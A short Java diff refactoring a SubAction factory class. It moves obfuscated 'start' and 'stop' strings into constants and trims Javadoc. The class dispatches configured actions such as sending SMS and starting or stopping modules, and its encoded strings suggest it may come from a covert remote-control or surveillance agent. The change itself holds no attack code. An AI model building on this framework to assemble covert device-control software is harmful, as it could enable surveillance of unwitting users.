@@ -25,6 +25,9 @@ public abstract class SubAction {
 
 	private static final String TAG = "SubAction"; //$NON-NLS-1$
 
+	private static final String startStr = M.e("start");
+	private static final String stopStr =  M.e("stop");;
+
 	/** Parameters. */
 	private final ConfAction conf;
 
@@ -39,17 +42,11 @@ public abstract class SubAction {
 
 	/**
 	 * Instantiates a new sub action.
-	 * 
-	 * @param type
-	 *            the type
-	 * @param jsubaction
-	 *            the params
 	 */
 	public SubAction(final ConfAction conf) {
 		this.status = Status.self();
 		this.conf = conf;
-
-		stop = conf.getBoolean(M.e("stop"), false); //$NON-NLS-1$        
+		stop = conf.getBoolean(stopStr, false); //$NON-NLS-1$
 
 		parse(conf);
 	}
@@ -58,9 +55,6 @@ public abstract class SubAction {
 	 * Factory.
 	 * 
 	 * @param type
-	 * 
-	 * @param typeId
-	 *            the type
 	 * @param params
 	 *            the conf params
 	 * @return the sub action
@@ -86,14 +80,14 @@ public abstract class SubAction {
 			return new SmsAction(params);
 		} else if (type.equals(M.e("module"))) { //$NON-NLS-1$
 			String status = params.getString(M.e("status")); //$NON-NLS-1$
-			if (status.equals(M.e("start"))) { //$NON-NLS-1$
+			if (status.equals(startStr)) { //$NON-NLS-1$
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_START_MODULE ***");//$NON-NLS-1$
 					Check.log(TAG + " params: " + params );
 				}
 				
 				return new StartModuleAction(params);
-			} else if (status.equals(M.e("stop"))) { //$NON-NLS-1$
+			} else if (status.equals(stopStr)) { //$NON-NLS-1$
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_STOP_MODULE ***");//$NON-NLS-1$
